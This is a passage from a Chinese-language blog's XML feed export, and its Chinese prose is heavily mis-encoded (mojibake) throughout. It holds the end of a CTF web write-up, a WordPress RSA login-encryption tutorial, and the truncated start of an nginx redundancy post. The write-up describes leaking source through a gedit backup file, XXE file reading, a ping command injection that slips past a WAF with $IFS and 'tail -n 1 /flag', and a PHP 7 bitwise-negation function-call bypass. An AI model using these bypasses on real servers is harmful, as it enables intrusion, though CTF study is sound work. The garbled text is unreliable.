srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C264.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C264.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>ç„¶åç½‘ä¸Šæœäº†ä¸‹å‘ç°geditåœ¨å†™å®Œæ–‡ä»¶åï¼Œé»˜è®¤ä¼šäº§ç”Ÿä¸€ä¸ªä»¥~ç»“å°¾çš„å¤‡ä»½æ–‡ä»¶å<br>ä¾‹å¦‚ï¼šindex.php~ã€‚è¿™å¯ç”¨äºä»æœåŠ¡å™¨ä¸­æå–æºä»£ç /æ–‡ä»¶ã€‚ç„¶åå¾¡å‰‘æ‰«æå‘ç°æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œäºæ˜¯è®¿é—®index.php~å¾—åˆ°æºç ã€‚å“¦è±ï¼Œæœç„¶æ˜¯xxeã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C383.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C383.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>æˆ‘æœ‰ä¸€ä¸ªå¤§èƒ†çš„æƒ³æ³•ï¼Œflag.phpä¼šä¸ä¼šä¹Ÿæœ‰å‘¢ï¼Ÿ<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C412.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C412.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>å¥½å§ï¼Œæ²¡æœ‰ã€‚é‚£æˆ‘ä»¬ç»§ç»­å¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼Œç»“åˆæ‰«æå‡ºæ¥çš„flag.phpï¼Œå¾—åˆ°base64ç¼–ç ã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C462.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C462.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>è§£ç å¯å¾—flag{IUyasd8213123123890}<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C495.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C495.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="3-å…è´¹çš„-pingä¸€ä¸‹"><a href="#3-å…è´¹çš„-pingä¸€ä¸‹" class="headerlink" title="3. å…è´¹çš„,pingä¸€ä¸‹~"></a>3. å…è´¹çš„,pingä¸€ä¸‹~</h3><p>ç»“åˆé¢˜ç›®å’Œé¡µé¢ï¼Œæ˜¯php pingå‘½ä»¤æ‰§è¡Œæ— è¯¯äº†ï¼Œlsä¸€ä¸‹ï¼Œæœç„¶æ˜¯è¿™æ ·ã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C547.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C547.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>ç„¶åå°è¯•lsä¸€ä¸‹æ ¹ç›®å½•ï¼Œå‘ç°wafè¿‡æ»¤æ•æ„Ÿå­—ç¬¦äº†ã€‚äºæ˜¯æµ‹è¯•è¢«è¿‡æ»¤æ‰çš„æ˜¯ç©ºæ ¼è¿˜æ˜¯â€œ/â€œæ–œæ ã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C595.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C595.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>ç»“åˆç½‘ä¸Šæœä¸€ä¸‹ï¼Œå¾—çŸ¥ä¸­æœ‰ä¸ªå˜é‡å«IFS(Internal Field Seprator) ,å†…éƒ¨åŸŸåˆ†éš”ç¬¦ï¼Œå³ç©ºæ ¼ã€‚ä»£æ›¿åŸæ¥çš„æˆåŠŸæ‰§è¡Œäº†ã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C666.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C666.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>ç»§ç»­lså¾—çŸ¥åŸæ¥æ˜¯ç©ºæ ¼è¢«wafè¿‡æ»¤æ‰äº†ã€‚å˜¿å˜¿ï¼Œé‚£å°±æ˜¯å¯ä»¥cat /flagå•¦ï¼Œæ‰§è¡Œä»¥ä¸‹ï¼Œç„¶åå¾—çŸ¥cat æˆ–flagå…³é”®å­—åˆè¢«è¿‡æ»¤äº†ã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C735.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C735.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>ç”±äºæˆ‘å¶å°”ä¼šç¼–å†™shellè„šæœ¬ï¼Œæƒ³åˆ°ç”¨å˜é‡æ‹¼æ¥å¯ä»¥ç»•è¿‡å…³é”®å­—çš„è¿‡æ»¤ã€‚ç„¶åä¸€é¡¿çŒ›å¦‚è™çš„æ“ä½œï¼Œç»“æœè¢«å‘ŠçŸ¥flagä¸åœ¨ç¬¬ä¸€è¡Œã€‚è€Œä¸”ä»–åªèƒ½æ˜¾ç¤ºéƒ¨åˆ†å†…å®¹ã€‚ã€‚ã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C812.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C812.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>æœ€åä½¿ç”¨tail -n 1 /flag æˆåŠŸè·å–flag{llllll_U_GeT_Th3_fl4g}<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C867.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C867.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="4-php"><a href="#4-php" class="headerlink" title="4. php"></a>4. php</h3><p>è®¿é—®é¡µé¢å¾—åˆ°ä¸€ä¸ªapacheçš„æ¬¢è¿é¡µé¢ï¼Œäºæ˜¯ç›´æ¥ç”¨å¾¡å‰‘æ‰«ï¼Œå¾—åˆ°ä¸‰ä¸ªæ–‡ä»¶<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C910.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C910.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>è®¿é—®index.phpå¾—çŸ¥æœ¬é¢˜ä¸ºæ¡ä»¶ç»•è¿‡å‹é¢˜ç›®ã€‚ç¬¬ä¸€çœ¼çœ‹è¿‡å»æ•´ä¸ªäººå‚»äº†ï¼Œæ— æ•°å­—å­—æ¯è¿˜å¥½è¯´ï¼Œå¯ä»¥ç”¨å¼‚æˆ–^ï¼Œå·¦å³ç§»ç­‰ç­‰å»ç»•è¿‡ã€‚ç„¶åå‘ç°å–åå’Œè‡ªå¢å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯é•¿åº¦åªæœ‰27ï¼Œå¤ªè‹›åˆ»äº†ã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1002.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1002.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>äºæ˜¯æƒ³åˆ°ï¼Œå¦‚æœè¿™ä¸ªæ˜¯php7ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨php7çš„æ–°ç‰¹æ€§ï¼Œå³å¯ä»¥é€šè¿‡($function)();çš„æ–¹å¼åŠ¨æ€æ‰§è¡Œå‡½æ•°ã€‚<br><a href="https://www.php.net/manual/zh/migration70.incompatible.php">https://www.php.net/manual/zh/migration70.incompatible.php</a><br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1199.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1199.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>å–å~ç¬¦å·å¯ä»¥æŠŠå­—æ¯æ•°å­—ç¬¦å·ç­‰ç­‰å˜ä¸ºä¸å¯è§å­—ç¬¦ï¼Œå°±å¯ä»¥è½»æ¾ç»•è¿‡æ­£åˆ™äº†ï¼Œä¸ºäº†è¢«æˆåŠŸè§£æï¼Œä½¿ç”¨urlencodeä¸€ä¸‹ã€‚</p><p>å…ˆcopyä¸‹æ¥ï¼Œæœ¬åœ°æµ‹è¯•ï¼Œæ³¨é‡Šæ‰é”™è¯¯å›æ˜¾ï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚å…ˆè¯•è¯•phpinfoæµ‹è¯•ä¸€ä¸‹ï¼Œé€šè¿‡ echo urlencode(~â€phpinfoâ€)æ„é€ ä¸€ä¸‹ã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1337.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1337.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>åŠ ä¸Š(~exp)(); è¯•è¯•ï¼Œå°±å‘ç°å¯ä»¥åœ¨é¢˜ç›®ç¯å¢ƒä¸­æˆåŠŸæ‰§è¡Œï¼Œæ¥ä¸‹æ¥å°±ç®€å•äº†ã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1381.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1381.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>æ„é€  GetYourFlagè°ƒç”¨GetYouFlag()<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1414.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1414.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1416.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1416.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>OKï¼Œæ¥ä¸‹æ¥<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1426.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1426.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>æœ€åå‘ç°flag{3904c5df2e894ca02a21004feb21e617} åœ¨æºç ä¸­ã€‚<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1479.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1479.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> æ¯”èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpressåå°ç™»å½•å¯†ç å‰ç«¯jsåŠ å¯†+phpåç«¯è§£å¯†</title>
      <link href="2019/08/26/wordpress%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8A%A0%E5%AF%86/"/>
      <url>2019/08/26/wordpress%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>ç”±äºç‰¹æ®ŠåŸå› ï¼Œwordpressåå°ç™»å½•å¯†ç ä¸èƒ½è¢«æ˜æ–‡æŠ“åŒ…â€¦<br>äºæ˜¯æˆ‘é‡‡ç”¨ rsa å‰ç«¯ js åŠ å¯† + php åç«¯è§£å¯† çš„æ–¹å¼è¿›è¡Œ</p><p>é‚£åªèƒ½å¤§è´¹å‘¨ç« å»æ”¹wordpressä»£ç äº†= = ã€‚ã€‚ã€‚ã€‚</p><p>ç”±äº wordpress ç™»å½•æ—¶ wp-login.php æ˜¯ç›´æ¥æäº¤è¡¨å•ç»™è‡ªå·±çš„<br>äºæ˜¯æƒ³åˆ°ç”¨ jquery å»ä¿®æ”¹è¡¨å•æ•°æ®ï¼Œ ç›´æ¥ä¸Šä»£ç ã€‚</p><h4 id="wordpressæ ¹ç›®å½•-wp-login-php-æ–‡ä»¶"><a href="#wordpressæ ¹ç›®å½•-wp-login-php-æ–‡ä»¶" class="headerlink" title="wordpressæ ¹ç›®å½• wp-login.php æ–‡ä»¶"></a>wordpressæ ¹ç›®å½• wp-login.php æ–‡ä»¶</h4><p>æ­¤å¤„éœ€è¦ç”¨åˆ°ä¸¤ä¸ªåº“æ–‡ä»¶ <a href="https://code.jquery.com/jquery-3.4.1.min.js">jQuery</a> å’Œ <a href="https://github.com/travist/jsencrypt">jsencrypt</a><br>åœ¨è¡¨å•ä»£ç åé¢çš„ js å¤„ æ·»åŠ </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./wp-includes/js/jquery/jquery-3.4.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./wp-includes/js/jsencrypt.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line">/*</span><br><span class="line"> * writeByï¼šTARI</span><br><span class="line"> * date: 2019/08/26</span><br><span class="line"><span class="javascript"> * usage: $(<span class="string">&quot;#user_pass&quot;</span>).changeæ–¹æ³•å¯¹å¯†ç è¿›è¡Œ rsa å…¬é’¥åŠ å¯†ä¼ è¾“</span></span><br><span class="line">*/</span><br><span class="line"><span class="javascript">$(<span class="string">&quot;#user_pass&quot;</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//å¤±å»ç„¦ç‚¹è§¦å‘ï¼Œå°±æ˜¯ç‚¹å‡»ç™»é™†æŒ‰é’®åè§¦å‘</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// æ•°æ®å¤„ç†</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> pubkey = <span class="string">&#x27;ä½ çš„å…¬é’¥&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> encrypt = <span class="keyword">new</span> JSEncrypt();</span></span><br><span class="line">encrypt.setPublicKey(pubkey);</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> encrypted = encrypt.encrypt($(<span class="string">&#x27;#user_pass&#x27;</span>).val())</span></span><br><span class="line"><span class="javascript"> $(<span class="string">&quot;#user_pass&quot;</span>).val(encrypted);<span class="comment">//é‡æ–°èµ‹å€¼</span></span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="handlebars"><span class="xml"><span class="comment">&lt;!-- ä¸‹é¢è¿˜æœ‰wp_attempt_focus()ç­‰å‡½æ•°ï¼Œ æˆ–è€…æ–°å»ºä¸€å¯¹ js æ ‡ç­¾ä¹Ÿè¡Œï¼Œä¸è¿‡æˆ‘æ²¡æµ‹è¯•è¿‡ --&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="wordpressæ ¹ç›®å½•-wp-includes-pluggable-php-æ–‡ä»¶"><a href="#wordpressæ ¹ç›®å½•-wp-includes-pluggable-php-æ–‡ä»¶" class="headerlink" title="wordpressæ ¹ç›®å½•/wp-includes/pluggable.php æ–‡ä»¶"></a>wordpressæ ¹ç›®å½•/wp-includes/pluggable.php æ–‡ä»¶</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_authenticate</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = sanitize_user(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = trim(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™é‡Œåæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</span></span><br><span class="line"><span class="comment">// ç§é’¥ä¸èƒ½å› ä¸ºå¥½çœ‹è€Œæ·»åŠ ä¹±ä¸ƒå…«ç³Ÿçš„ç¼©å‡ä¹‹ç±»çš„</span></span><br><span class="line"><span class="variable">$private_key</span> = <span class="string">&quot;ç§é’¥å†…å®¹&quot;</span>;</span><br><span class="line"><span class="variable">$decrypt_data</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// åˆ¤æ–­ç§é’¥æ˜¯å¦æ˜¯å¯ç”¨çš„ï¼Œå¯ç”¨è¿”å›èµ„æºid</span></span><br><span class="line"><span class="variable">$pi_key</span> =  openssl_pkey_get_private(<span class="variable">$private_key</span>);</span><br><span class="line"><span class="comment">// è§£å¯†æ•°æ®, è¿™é‡Œè¦è¿›è¡Œ base64 è§£ç æ˜¯å› ä¸ºæµè§ˆå™¨ä¼šé»˜è®¤å¸®ä½ çš„æ•°æ®è¿›è¡Œç¼–ç </span></span><br><span class="line">openssl_private_decrypt(base64_decode(<span class="variable">$password</span>), <span class="variable">$decrypt_data</span>, <span class="variable">$private_key</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$decrypt_data</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸‹é¢ä¸€å †ä»£ç  balabala</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æŠ“åŒ…å¯†ç å°±æ˜¯åŠ å¯†çŠ¶æ€å•¦ï¼<br>åœ¨ wordpress æ‰¾å¯†ç éªŒè¯çš„å‡½æ•°å’Œæ–‡ä»¶æ‰¾äº†æŒºä¹…çš„â€¦.</p>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
          <category> Wordpress </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
            <tag> Wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginxåŒå†—ä½™åŠè´Ÿè½½å‡è¡¡æ­å»º</title>
      <link href="2019/07/28/Redundancy%20and%20load%20balancing/"/>
      <url>2019/07/28/Redundancy%20and%20load%20balancing/</url>
      
        <content type="html"><![CDATA[<h3 id="nginx-åŒå†—ä½™"><a href="#nginx-åŒå†—ä½™" class="headerlink" title="nginx åŒå†—ä½™"></a>nginx åŒå†—ä½™</h3><p><a href="https://github.com/TARI0510/webAnsible/tree/master/roles/keepalived">nginx å†—ä½™å®‰è£…è„šæœ¬é“¾æ¥</a><br>é…ç½®æ–‡ä»¶çš„ <a href="#">é“¾æ¥åœ¨æ­¤</a></p><h4 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="**æ³¨æ„äº‹é¡¹**"></a>**æ³¨æ„äº‹é¡¹**</h4><ul><li><p>/etc/selinux/config<br>SELINUX=off</p></li><li><p>æ„Ÿè§‰çº¿ä¸Šå’Œçº¿ä¸‹ä¸€ä¸ªæ¯”è¾ƒå¤§çš„åŒºåˆ«å°±åœ¨é˜²ç«å¢™ï¼Œçº¿ä¸‹å¯ä»¥çš„åœ¨è¢«è¿™ä¸ªå¡äº†åŠå¤©</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eth0 è¯¥å­—æ®µæ 